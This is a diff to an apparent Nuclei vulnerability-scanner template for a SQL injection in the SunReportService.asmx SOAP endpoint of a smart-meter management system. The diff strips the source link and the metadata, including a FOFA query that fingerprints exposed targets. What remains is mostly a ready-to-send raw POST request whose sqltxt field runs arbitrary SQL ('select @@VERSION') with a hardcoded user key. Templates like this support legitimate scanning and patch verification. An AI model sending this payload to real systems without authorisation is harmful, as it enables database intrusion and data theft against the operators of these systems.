@@ -3,12 +3,8 @@ info:
   name: 智能表综合管理系统 SunReportService.asmx SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dxp6gwkyfdhbo7q9'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dxp6gwkyfdhbo7q9
-    fofa: body="Ajax_Code/Login.ashx"
 http:
 - raw:
   - "POST /SunReportService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://suntront.com/GetReportData\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetReportData xmlns=\"http://suntront.com/\">\n      <sqltxt>select @@VERSION</sqltxt>\n      <Userkey>XTSunReport</Userkey>\n    </GetReportData>\n  </soap:Body>\n</soap:Envelope>"
